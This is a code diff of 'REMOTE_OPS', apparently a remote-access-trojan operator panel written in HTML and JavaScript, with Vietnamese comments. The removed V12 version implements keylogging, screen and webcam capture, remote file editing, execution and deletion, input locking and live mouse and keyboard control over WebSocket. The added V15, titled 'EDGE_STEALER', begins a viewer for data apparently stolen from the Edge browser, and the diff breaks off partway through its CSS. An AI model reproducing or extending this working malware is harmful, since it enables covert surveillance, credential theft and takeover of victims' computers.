@@ -1,1151 +1,726 @@
-<!-- <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>REMOTE_OPS // V12_SMART_EXPLORER</title>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <style>
-        /* --- CORE CSS --- */
-        :root { --bg-color: #050505; --panel-bg: rgba(10, 20, 10, 0.95); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
-        * { box-sizing: border-box; }
-        body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .header { padding: 10px 20px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; }
-        .brand { font-size: 20px; font-weight: bold; } input, button, textarea { font-family: 'Share Tech Mono'; padding: 6px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; }
-        button:hover { background: var(--main-color); color: #000; cursor: pointer; }
-        .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
-        .btn-red:hover { background: var(--alert-color); color: #fff; }
-
-        .main-grid { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 50px); }
-        .panel { background: var(--panel-bg); border: var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
-
-        /* TABS */
-        .tab-bar { display: flex; gap: 5px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        .tab-btn { flex: 1; border: none; background: #111; color: #555; font-size: 11px; }
-        .tab-btn.active { background: var(--main-color); color: #000; }
-
-        /* EXPLORER */
-        .address-bar { display: flex; background: #111; border-bottom: 1px solid #333; padding: 8px; gap: 5px; align-items: center; }
-        .crumb { cursor: pointer; color: #aaa; } .crumb:hover { color: #fff; text-decoration: underline; }
-        
-        .file-grid { flex-grow: 1; overflow-y: auto; padding: 10px; display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; align-content: start; }
-        .file-item { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px; border: 1px solid transparent; border-radius: 5px; cursor: pointer; }
-        .file-item:hover { background: #112211; border-color: #004400; }
-        .file-icon { font-size: 32px; margin-bottom: 5px; }
-        .file-name { font-size: 11px; word-break: break-all; color: #ccc; }
-
-        /* CONTEXT MENU */
-        #context-menu { position: absolute; display: none; background: #111; border: 1px solid var(--main-color); z-index: 100; min-width: 140px; }
-        .ctx-item { padding: 8px 12px; cursor: pointer; font-size: 12px; border-bottom: 1px solid #222; }
-        .ctx-item:hover { background: var(--main-color); color: #000; }
-
-        /* EDITOR MODAL */
-        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; display: none; align-items: center; justify-content: center; }
-        .modal-content { width: 85%; height: 85%; background: #000; border: 1px solid var(--main-color); display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        .modal-header { padding: 10px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-        #editor-text { flex-grow: 1; background: #0c0c0c; color: #e0e0e0; border: none; padding: 15px; font-family: 'Fira Code', monospace; resize: none; outline: none; font-size: 13px; line-height: 1.5; }
-
-        /* LIST & PREVIEW */
-        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid #333; }
-        .file-item-list { padding: 8px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; font-size: 11px; }
-        .preview-area { 
-    flex-grow: 1; 
-    display: flex; 
-    flex-direction: column; 
-    align-items: center; 
-    justify-content: center; 
-    background: #000; 
-    border: 1px solid #333; 
-    position: relative; 
-    overflow: hidden; /* Cắt phần thừa nếu có */
-}
-
-/* QUAN TRỌNG: Đảm bảo ảnh giữ đúng tỷ lệ và không bị méo */
-.preview-area img { 
-    max-width: 100%; 
-    max-height: 100%; 
-    width: auto;      /* Để tự động theo tỷ lệ gốc */
-    height: auto;     /* Để tự động theo tỷ lệ gốc */
-    object-fit: contain; /* Hiển thị toàn bộ ảnh */
-    cursor: crosshair;   /* Đổi con trỏ chuột cho dễ nhìn */
-}
-        
-        .hidden { display: none !important; }
-        .key-box { width: 100%; height: 100px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 12px; resize: none; margin-top: 5px; }
-    </style>
-</head>
-<body>
-
-    <div class="header">
-        <div class="brand">REMOTE<span>OPS</span></div>
-        <div>
-            <input type="text" id="ip" value="ws://localhost:9010">
-            <button onclick="connect()">CONNECT</button>
-        </div>
-    </div>
-
-    <div class="main-grid">
-        <div class="panel">
-            <div class="tab-bar">
-                <button class="tab-btn active" onclick="switchTab('control')">CONTROLS</button>
-                <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
-                <button class="tab-btn" onclick="switchTab('gallery')">GALLERY</button>
-            </div>
-
-            <div id="tab-control" style="display:flex; flex-direction:column; height:100%; overflow-y: auto;">
-                <button onclick="send('PROCESS','LIST')" style="margin-bottom:5px;">REFRESH PROCESS</button>
-                <button onclick="send('APP','LIST')" style="margin-bottom:5px;">REFRESH APPS</button>
-                <div style="border-top:1px dashed #333; margin:10px 0;"></div>
-                <button onclick="takeScreenshot()">📷 CAPTURE SCREEN</button>
-                <button onclick="startWebcam()" style="margin-top:5px;">⏺ REC WEBCAM</button>
-                <button onclick="stopWebcam()" style="margin-top:5px;" class="btn-red">■ STOP & SAVE</button>
-                <button id="btn-remote" onclick="toggleRemote()">🎮 REMOTE CONTROL</button>
-                <div style="border-top:1px dashed #333; margin:10px 0; padding-top:10px;">
-                    <div style="font-size:12px; color:#aaa; margin-bottom:5px;">KEYLOGGER</div>
-                    <div style="display:flex; gap:5px;">
-                        <button onclick="send('KEYBOARD','START')" style="flex:1">▶ REC</button>
-                        <button onclick="send('KEYBOARD','STOP')" class="btn-red" style="flex:1">■ STOP</button>
-                    </div>
-                    <textarea id="key-stream" class="key-box" readonly placeholder="> Keystrokes..."></textarea>
-                    
-                    <div style="font-size:12px; color:#aaa; margin-top:10px; margin-bottom: 5px;">SECURITY</div>
-                    <div style="display:flex; gap:5px;">
-                        <button class="btn-red" onclick="send('KEYBOARD','LOCK')" style="flex:1">🔒 LOCK</button>
-                        <button onclick="send('KEYBOARD','UNLOCK')" style="flex:1">🔓 UNLOCK</button>
-                    </div>
-                </div>
-            </div>
-
-            <div id="tab-explorer" class="hidden" style="display:flex; flex-direction:column; height:100%;">
-                <div style="padding:10px; color:#aaa; font-size:11px; text-align:center;">
-                    Files are shown in the main panel ->
-                </div>
-                <button onclick="send('FILE','LIST_DIR',{path:''})">💻 MY COMPUTER</button>
-                <button onclick="refresh()" style="margin-top:5px;">↻ REFRESH DIR</button>
-            </div>
-
-            <div id="tab-gallery" class="hidden" style="display:flex; flex-direction:column; height:100%;">
-                <button onclick="send('FILE','LIST')" style="margin-bottom: 5px;">↻ RELOAD LIST</button>
-                <div class="file-list" id="file-list-box">
-                    <div style="padding:10px; color:#666; text-align:center;">Empty</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="panel">
-            <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
-                <div class="address-bar" id="breadcrumbs"><span>Not Connected</span></div>
-                <div class="file-grid" id="file-grid"></div>
-            </div>
-
-            <div id="media-view" class="preview-area">
-                <div style="position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.7); padding:2px 5px; color:#aaa; font-size:11px;" id="view-label">WAITING...</div>
-                <img id="main-view" alt="">
-                <video id="video-player" controls class="hidden"></video>
-            </div>
-
-            <div id="log-area" style="height:60px; background:#000; border-top:1px solid #333; font-size:11px; color:#0f0; overflow-y:auto;"></div>
-        </div>
-    </div>
-
-    <div id="context-menu">
-        <div class="ctx-item" onclick="ctxSmartOpen()">🚀 Open / Edit</div>
-        <div class="ctx-item" onclick="ctxDownload()">⬇ Download</div>
-        <div class="ctx-item" onclick="ctxDelete()" style="color:var(--alert-color)">❌ Delete</div>
-    </div>
-
-    <div id="editor-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <span id="editor-title" style="color:#00ff41; font-weight:bold;">Editing...</span>
-                <div>
-                    <button onclick="saveFile()" style="border-color:#00ff41; color:#00ff41;">💾 SAVE & CLOSE</button>
-                    <button class="btn-red" onclick="closeEditor()">CANCEL</button>
-                </div>
-            </div>
-            <textarea id="editor-text"></textarea>
-        </div>
-    </div>
-
-    <canvas id="record-canvas" style="display:none;"></canvas>
-
-<script>
-    let ws = null;
-    let currentPath = "";
-    let selectedFile = null;
-    let mediaRecorder = null, recordedChunks = [], isRecording = false;
-    const canvas = document.getElementById('record-canvas');
-    const ctx = canvas.getContext('2d');
-
-    // --- UTILS: DETECT FILE TYPE ---
-    function isTextFile(filename) {
-        const exts = ['.txt', '.cpp', '.h', '.hpp', '.c', '.js', '.html', '.css', '.json', '.xml', '.log', '.ini', '.bat', '.cmd', '.py'];
-        return exts.some(ext => filename.toLowerCase().endsWith(ext));
-    }
-
-    // --- CONNECTION ---
-    function connect() {
-        ws = new WebSocket(document.getElementById('ip').value);
-        ws.binaryType = "arraybuffer";
-        ws.onopen = () => { log("Connected"); send('FILE','LIST_DIR',{path:''}); };
-        ws.onmessage = handleMessage;
-    }
-    function send(mod, cmd, payload={}) { if(ws) ws.send(JSON.stringify({module:mod, command:cmd, payload:payload})); }
-
-    // --- MESSAGE HANDLER ---
-    function handleMessage(evt) {
-        if (evt.data instanceof ArrayBuffer) {
-            // Binary Handling (Image/Video/Download)
-            const blob = new Blob([evt.data]);
-            // Nếu đang trong modal editor hoặc context menu download -> Tải về
-            if (selectedFile && selectedFile.downloading) {
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a'); a.href = url; a.download = selectedFile.name; a.click();
-                selectedFile.downloading = false;
-                log("File downloaded: " + selectedFile.name);
-            } else {
-                // Mặc định là Stream ảnh/video
-                const url = URL.createObjectURL(blob);
-                const imgView = document.getElementById('main-view');
-                imgView.src = url;
-                if(isRecording) {
-                    const img = new Image(); img.onload = () => {
-                        if (canvas.width !== img.width) { canvas.width = img.width; canvas.height = img.height; }
-                        ctx.drawImage(img, 0, 0);
-                    }; img.src = url;
-                }
-            }
-        } else {
-            try { handleJson(JSON.parse(evt.data)); } catch(e){}
-        }
-    }
-
-    function handleJson(res) {
-        if (res.command === 'LIST_DIR') renderExplorer(res);
-        else if (res.command === 'READ_TEXT') openEditor(res);
-        else if (res.command === 'WRITE_TEXT') {
-            // [QUAN TRỌNG] LƯU XONG TỰ ĐÓNG
-            if (res.status === 'success') {
-                alert("File Saved Successfully!");
-                closeEditor(); // Đóng modal
-                refresh();     // Refresh lại list file
-            } else {
-                alert("Error saving file: " + res.message);
-            }
-        }
-        else if (res.command === 'EXECUTE') {
-            alert(res.status === 'success' ? "Executed on Server!" : "Execution Failed: " + res.message);
-        }
-        else if (res.command === 'DELETE' && res.status === 'success') refresh();
-        else if (res.command === 'SAVE_VIDEO') { log("Video Saved!"); send('FILE','LIST'); switchTab('gallery'); }
-        else if (res.module === 'KEYBOARD') {
-            document.getElementById('key-stream').value += res.data.key;
-        }
-        else if (res.module === 'FILE' && res.command === 'LIST') renderGallery(res.data);
-    }
-
-    // --- EXPLORER LOGIC ---
-    function renderExplorer(res) {
-        currentPath = res.current_path;
-        renderBreadcrumbs(currentPath);
-        const grid = document.getElementById('file-grid');
-        grid.innerHTML = "";
-        
-        // Sort: Drive -> Dir -> File
-        const list = res.data.sort((a,b) => (a.type==='drive'?0:a.type==='dir'?1:2) - (b.type==='drive'?0:b.type==='dir'?1:2));
-
-        list.forEach(f => {
-            const el = document.createElement('div');
-            el.className = 'file-item';
-            let icon = f.type==='drive'?'💽': f.type==='dir'?'📁': f.type==='image'?'🖼️': '📄';
-            el.innerHTML = `<div class="file-icon">${icon}</div><div class="file-name">${f.name}</div>`;
-            
-            // CLICK LOGIC
-            el.onclick = () => {
-                if(f.type === 'dir' || f.type === 'drive') send('FILE','LIST_DIR',{path: f.path});
-                else {
-                    selectedFile = f;
-                    ctxSmartOpen(); // Gọi hàm mở thông minh
-                }
-            };
-            // CONTEXT MENU
-            el.oncontextmenu = (e) => {
-                e.preventDefault();
-                selectedFile = f;
-                showContextMenu(e.clientX, e.clientY, f.type);
-            };
-            grid.appendChild(el);
-        });
-    }
-
-    function ctxSmartOpen() {
-        if (!selectedFile) return;
-        document.getElementById('context-menu').style.display = 'none';
-
-        // [QUAN TRỌNG] KIỂM TRA ĐUÔI FILE
-        if (isTextFile(selectedFile.name)) {
-            // Nếu là file code -> Gửi lệnh ĐỌC để sửa
-            log("Opening editor for: " + selectedFile.name);
-            send('FILE', 'READ_TEXT', {path: selectedFile.path});
-        } else {
-            // Nếu là exe, ảnh, nhạc -> Gửi lệnh CHẠY
-            if(confirm("Execute/Run " + selectedFile.name + " on Server?")) {
-                send('FILE', 'EXECUTE', {path: selectedFile.path});
-            }
-        }
-    }
-
-    function openEditor(res) {
-        document.getElementById('editor-modal').style.display = 'flex';
-        document.getElementById('editor-text').value = res.content;
-        document.getElementById('editor-title').innerText = "EDIT: " + res.path;
-        // Lưu path vào selectedFile để dùng khi save
-        selectedFile = { path: res.path, name: res.path.split(/[\\/]/).pop() }; 
-    }
-
-    function saveFile() {
-        const content = document.getElementById('editor-text').value;
-        send('FILE', 'WRITE_TEXT', { path: selectedFile.path, content: content });
-    }
-
-    function closeEditor() { document.getElementById('editor-modal').style.display = 'none'; }
-
-    // --- OTHER UI FUNCTIONS ---
-    function renderBreadcrumbs(path) {
-        const bar = document.getElementById('breadcrumbs');
-        if(!path) { bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">MY COMPUTER</span>"; return; }
-        const parts = path.split(/[\\/]/).filter(p => p.length > 0);
-        bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">PC</span> > ";
-        let built = "";
-        parts.forEach((p,i) => {
-            built += (i===0 && p.includes(':') ? p+"\\" : (i===0?p:"\\"+p));
-            bar.innerHTML += `<span class='crumb' onclick="send('FILE','LIST_DIR',{path:'${built.replace(/\\/g,'\\\\')}'})">${p}</span>` + (i<parts.length-1?" > ":"");
-        });
-    }
-
-    function showContextMenu(x, y) {
-        const menu = document.getElementById('context-menu');
-        menu.style.display = 'block'; menu.style.left = x+'px'; menu.style.top = y+'px';
-    }
-    document.addEventListener('click', () => document.getElementById('context-menu').style.display = 'none');
-
-    function ctxDownload() {
-        if(!selectedFile) return;
-        selectedFile.downloading = true; // Đánh dấu để handleMessage biết
-        send('FILE', 'GET', {name: selectedFile.path});
-    }
-    function ctxDelete() {
-        if(selectedFile && confirm("Delete "+selectedFile.name+"?")) send('FILE','DELETE',{path:selectedFile.path});
-    }
-
-    function switchTab(tab) {
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
-        
-        const views = {
-            'control': ['tab-control', 'media-view'],
-            'explorer': ['tab-explorer', 'explorer-view'],
-            'gallery': ['tab-gallery', 'media-view']
-        };
-
-        // Hide all
-        ['tab-control','tab-explorer','tab-gallery'].forEach(id => document.getElementById(id).classList.add('hidden'));
-        ['media-view','explorer-view'].forEach(id => document.getElementById(id).classList.add('hidden'));
-
-        // Show selected
-        document.getElementById(views[tab][0]).classList.remove('hidden');
-        document.getElementById(views[tab][1]).classList.remove('hidden');
-
-        if(tab==='explorer') send('FILE','LIST_DIR',{path: currentPath});
-        if(tab==='gallery') send('FILE','LIST');
-        
-        // Reset player if moving away from gallery
-        if(tab!=='gallery') { 
-            const vp=document.getElementById('video-player'); vp.pause(); vp.classList.add('hidden'); 
-            document.getElementById('main-view').classList.remove('hidden');
-        }
-    }
-
-    // --- MEDIA & REC FUNCTIONS ---
-    function renderGallery(data) {
-        const list = document.getElementById('file-list-box'); list.innerHTML = "";
-        data.reverse().forEach(f => {
-            const div = document.createElement('div'); div.className = 'file-item-list';
-            div.innerHTML = `<span>${f.name}</span> <span style="color:#666">${(f.size/1024).toFixed(1)} KB</span>`;
-            div.onclick = () => {
-                document.getElementById('main-view').classList.add('hidden');
-                document.getElementById('video-player').classList.add('hidden');
-                if(f.name.endsWith('.webm')) {
-                    const vp = document.getElementById('video-player'); vp.classList.remove('hidden');
-                    ws.onmessage = (e) => { vp.src = URL.createObjectURL(new Blob([e.data],{type:'video/webm'})); vp.play(); ws.onmessage = handleMessage; };
-                } else {
-                    document.getElementById('main-view').classList.remove('hidden');
-                    ws.onmessage = (e) => { document.getElementById('main-view').src = URL.createObjectURL(new Blob([e.data],{type:'image/jpeg'})); ws.onmessage = handleMessage; };
-                }
-                send('FILE','GET',{name:f.name});
-            };
-            list.appendChild(div);
-        });
-    }
-
-    function startWebcam() { send('WEBCAM','START_STREAM'); isRecording=true; recordedChunks=[]; mediaRecorder = new MediaRecorder(canvas.captureStream(25)); mediaRecorder.ondataavailable=e=>{if(e.data.size>0)recordedChunks.push(e.data)}; mediaRecorder.onstop=uploadVideo; mediaRecorder.start(); document.getElementById('view-label').innerText="REC..."; }
-    function stopWebcam() { send('WEBCAM','STOP_STREAM'); if(isRecording) { mediaRecorder.stop(); isRecording=false; } }
-    function uploadVideo() { const r=new FileReader(); r.readAsDataURL(new Blob(recordedChunks,{type:'video/webm'})); r.onloadend=()=>{ send('FILE','SAVE_VIDEO',{name:`rec_${new Date().getTime()}.webm`, data:r.result.split(',')[1]}); }; }
-    function takeScreenshot() { 
-        switchTab('control'); 
-        // Thêm payload {save: true} (hoặc không cần vì mặc định là true)
-        send('SCREEN', 'CAPTURE_BINARY', { save: true }); 
-    }
-    function refresh() { send('FILE','LIST_DIR',{path: currentPath}); }
-    function log(m) { document.getElementById('log-area').innerText += `> ${m}\n`; }
-    let isRemoteControl = false;
-let lastMove = 0;
-
-// --- HÀM BẬT/TẮT ĐIỀU KHIỂN ---
-function toggleRemote() {
-    isRemoteControl = !isRemoteControl;
-    const btn = document.getElementById('btn-remote'); // Bạn cần thêm nút này vào HTML
-    const img = document.getElementById('main-view');
-    
-    if (isRemoteControl) {
-        btn.style.color = "#00ff41"; 
-        btn.innerText = "🎮 CONTROL: ON";
-        img.style.cursor = "crosshair"; // Đổi con trỏ chuột
-        
-        // Gắn sự kiện
-        setupInputListeners(img);
-        
-        // Tự động chụp màn hình liên tục để thấy phản hồi (FPS thấp thôi để đỡ lag)
-        window.remoteInterval = setInterval(() => {
-                                    // Thêm payload {save: false} để Server biết đừng lưu ảnh này
-                                    send('SCREEN', 'CAPTURE_BINARY', { save: false });
-                                }, 100);
-    } else {
-        btn.style.color = ""; 
-        btn.innerText = "🎮 CONTROL: OFF";
-        img.style.cursor = "default";
-        
-        // Gỡ sự kiện
-        removeInputListeners(img);
-        clearInterval(window.remoteInterval);
-    }
-}
-
-// --- GẮN SỰ KIỆN ---
-function setupInputListeners(element) {
-    // Chuột
-    element.addEventListener('mousemove', onRemoteMouseMove);
-    element.addEventListener('mousedown', onRemoteMouseDown);
-    element.addEventListener('mouseup', onRemoteMouseUp);
-    element.addEventListener('contextmenu', (e) => e.preventDefault()); // Cho phép chuột phải
-    element.addEventListener('wheel', onRemoteWheel, {passive: false}); // Lăn chuột
-
-    // Phím (Gắn vào window để bắt toàn cục)
-    window.addEventListener('keydown', onRemoteKeyDown);
-    window.addEventListener('keyup', onRemoteKeyUp);
-}
-
-function removeInputListeners(element) {
-    element.removeEventListener('mousemove', onRemoteMouseMove);
-    element.removeEventListener('mousedown', onRemoteMouseDown);
-    element.removeEventListener('mouseup', onRemoteMouseUp);
-    element.removeEventListener('contextmenu', (e) => e.preventDefault());
-    element.removeEventListener('wheel', onRemoteWheel);
-    window.removeEventListener('keydown', onRemoteKeyDown);
-    window.removeEventListener('keyup', onRemoteKeyUp);
-}
-
-// --- LOGIC TÍNH TOẠ ĐỘ CHUẨN XÁC ---
-function sendMouse(cmd, e, type=null) {
-    const img = document.getElementById('main-view');
-    
-    // Lấy kích thước hiển thị thực tế của thẻ IMG
-    const rect = img.getBoundingClientRect();
-
-    // 1. Tính toạ độ chuột so với góc trái trên của ẢNH (không phải màn hình)
-    let clientX = e.clientX - rect.left;
-    let clientY = e.clientY - rect.top;
-
-    // 2. Tính tỷ lệ (0.0 đến 1.0)
-    // Lưu ý: rect.width/height ở đây là kích thước hiển thị trên web
-    const xRel = clientX / rect.width;
-    const yRel = clientY / rect.height;
-
-    // 3. Gửi sang Server
-    // Chỉ gửi nếu chuột nằm trong phạm vi ảnh (tránh click vào viền đen)
-    if (xRel >= 0 && xRel <= 1 && yRel >= 0 && yRel <= 1) {
-        let btn = 'left';
-        if (e.button === 2) btn = 'right';
-        if (e.button === 1) btn = 'middle';
-
-        send('INPUT', cmd, { 
-            x: xRel, 
-            y: yRel, 
-            btn: btn, 
-            type: type 
-        });
-    }
-}
-
-function onRemoteMouseMove(e) {
-    const now = Date.now();
-    if (now - lastMove < 50) return; // Giới hạn gửi 20 lần/giây để không nghẽn mạng
-    lastMove = now;
-    sendMouse('MOUSE_MOVE', e);
-}
-
-function onRemoteMouseDown(e) { sendMouse('MOUSE_BTN', e, 'down'); }
-function onRemoteMouseUp(e) { sendMouse('MOUSE_BTN', e, 'up'); }
-
-function onRemoteWheel(e) {
-    e.preventDefault();
-    // Server cần số âm để cuộn xuống, dương để lên (ngược với JS một chút tùy trình duyệt)
-    let delta = (e.deltaY > 0) ? -120 : 120; 
-    send('INPUT', 'MOUSE_WHEEL', { delta: delta });
-}
-
-// --- XỬ LÝ PHÍM ---
-function onRemoteKeyDown(e) {
-    if (!isRemoteControl) return;
-    e.preventDefault(); // Chặn phím tắt trình duyệt (F5, Ctrl+S...)
-    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'down' });
-}
-
-function onRemoteKeyUp(e) {
-    if (!isRemoteControl) return;
-    e.preventDefault();
-    send('INPUT', 'KEY_EVENT', { key: e.keyCode, type: 'up' });
-}
-</script>
-</body>
-</html> -->
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>REMOTE_OPS // V14_FULL_CONTROL</title>
+    <title>REMOTE_OPS // V15_EDGE_STEALER</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        /* --- CORE DARK THEME --- */
         :root { --bg-color: #050505; --panel-bg: rgba(12, 14, 12, 0.98); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
         * { box-sizing: border-box; }
         body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; user-select: none; }
         
-        /* HEADER */
         .header { padding: 8px 15px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; height: 50px; }
         .brand { font-size: 22px; font-weight: bold; letter-spacing: 2px; } .brand span { color: var(--accent-color); }
         input, button, textarea { font-family: 'Share Tech Mono'; padding: 5px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; transition: 0.2s; }
-        button:hover { background: var(--main-color); color: #000; cursor: pointer; box-shadow: 0 0 8px var(--main-color); }
+        button:hover { background: var(--main-color); color: #000; cursor: pointer; box-shadow: 0 0 10px var(--main-color); }
         .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
-        .btn-red:hover { background: var(--alert-color); color: #fff; box-shadow: 0 0 8px var(--alert-color); }
+        .btn-red:hover { background: var(--alert-color); color: #fff; }
+        .btn-blue { border-color: #0088ff; color: #0088ff; }
+        .btn-blue:hover { background: #0088ff; color: #fff; }
 
-        /* LAYOUT */
-        .main-grid { display: grid; grid-template-columns: 320px 1fr; height: calc(100vh - 50px); }
-        .panel { background: var(--panel-bg); border-right: var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
+        .main-grid { display: grid; grid-template-columns: 340px 1fr; height: calc(100vh - 50px); }
+        .panel { background: var(--panel-bg); border-right: var(--border); padding: 12px; display: flex; flex-direction: column; overflow: hidden; gap: 12px; }
         .right-panel { background: #000; display: flex; flex-direction: column; position: relative; overflow: hidden; }
 
-        /* TABS */
-        .tab-bar { display: flex; gap: 5px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .tab-btn { flex: 1; border: none; background: #111; color: #666; font-size: 12px; font-weight: bold; }
+        .tab-bar { display: flex; gap: 6px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 8px; }
+        .tab-btn { flex: 1; border: none; background: #111; color: #666; font-size: 11px; font-weight: bold; padding: 8px; }
         .tab-btn.active { background: var(--main-color); color: #000; }
 
-        /* CONTROL GROUPS */
-        .ctrl-group { border: 1px dashed #333; padding: 10px; margin-bottom: 10px; background: rgba(0,255,0,0.02); }
-        .ctrl-title { font-size: 11px; color: #666; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; font-weight: bold; }
-        .btn-row { display: flex; gap: 5px; margin-bottom: 5px; } .btn-row button { flex: 1; }
-        .input-row { display: flex; gap: 5px; margin-bottom: 5px; } 
-        .input-row input { flex: 2; font-size: 11px; } .input-row button { flex: 1; font-size: 11px; }
+        .ctrl-group { border: 1px dashed #333; padding: 12px; background: rgba(0,255,65,0.03); border-radius: 6px; }
+        .ctrl-title { font-size: 11px; color: #0f0; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: bold; }
 
-        .key-box { width: 100%; height: 80px; background: #080808; border: 1px solid #333; color: #0f0; font-size: 11px; resize: none; margin-top: 5px; padding: 5px; font-family: 'Fira Code', monospace; }
+        .btn-row { display: flex; gap: 6px; margin-top: 6px; }
+        .btn-row button { flex: 1; font-size: 11px; padding: 10px; }
 
-        /* EXPLORER & PREVIEW */
-        .address-bar { display: flex; background: #111; border-bottom: 1px solid #333; padding: 8px; gap: 5px; align-items: center; color: #fff; font-size: 13px; }
-        .crumb { cursor: pointer; color: #888; } .crumb:hover { color: #fff; text-decoration: underline; }
-        .file-grid { flex-grow: 1; overflow-y: auto; padding: 10px; display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 10px; align-content: start; }
+        .result-box {
+            background: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 8px;
+            display: none;
+            border-radius: 4px;
+        }
         
-        .file-item { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px; border: 1px solid transparent; border-radius: 4px; cursor: pointer; color: #ccc; }
-        .file-item:hover { background: #112211; border-color: #004400; color: #fff; }
-        .file-icon { font-size: 36px; margin-bottom: 5px; }
-        .file-name { font-size: 11px; word-break: break-all; line-height: 1.3; max-height: 2.6em; overflow: hidden; }
+        .edge-data-container {
+            background: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            font-family: 'Fira Code', monospace;
+            font-size: 11px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 8px;
+            display: none;
+            border-radius: 4px;
+        }
+        
+        .copy-btn {
+            margin-top: 6px;
+            padding: 6px;
+            font-size: 10px;
+            background: #003300;
+            border-color: #00ff41;
+        }
 
         .preview-area { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; position: relative; overflow: hidden; }
-        .preview-area img { max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain; cursor: crosshair; }
-        video { max-width: 100%; max-height: 100%; object-fit: contain; }
-
-        /* MODALS & LOGS */
-        #context-menu { position: absolute; display: none; background: #111; border: 1px solid var(--main-color); z-index: 1000; min-width: 150px; box-shadow: 0 5px 15px rgba(0,0,0,0.8); }
-        .ctx-item { padding: 10px 15px; cursor: pointer; font-size: 12px; border-bottom: 1px solid #222; }
-        .ctx-item:hover { background: var(--main-color); color: #000; }
-
-        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; display: none; flex-direction: column; }
-        .modal-content { flex-grow: 1; display: flex; flex-direction: column; margin: 20px; border: 1px solid var(--main-color); background: #111; }
-        .modal-header { padding: 10px; background: #002200; border-bottom: 1px solid var(--main-color); display: flex; justify-content: space-between; align-items: center; }
-        #editor-text { flex-grow: 1; background: #0c0c0c; color: #e0e0e0; border: none; padding: 15px; font-family: 'Fira Code', monospace; resize: none; outline: none; font-size: 14px; line-height: 1.6; }
-
-        #log-area { height: 30px; background: #050505; border-top: 1px solid #333; font-size: 11px; color: #00ff41; padding: 5px 10px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .preview-area img { max-width: 100%; max-height: 100%; object-fit: contain; cursor: crosshair; }
+        #log-area { height: 30px; background: #000; border-top: 1px solid #333; padding: 5px 15px; font-size: 11px; color: #00ff41; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .hidden { display: none !important; }
-        .active-remote { border: 2px solid var(--alert-color) !important; color: var(--alert-color) !important; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        
+        /* Tabs cho Edge data */
+        .edge-tabs { display: flex; margin-bottom: 10px; border-bottom: 1px solid #333; }
+        .edge-tab { padding: 8px 12px; background: #111; color: #666; cursor: pointer; font-size: 10px; }
+        .edge-tab.active { background: #222; color: #0f0; border-bottom: 2px solid #0f0; }
+        
+        /* Tables cho Edge data */
+        .edge-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 10px;
+            margin-bottom: 10px;
+        }
+        .edge-table th {
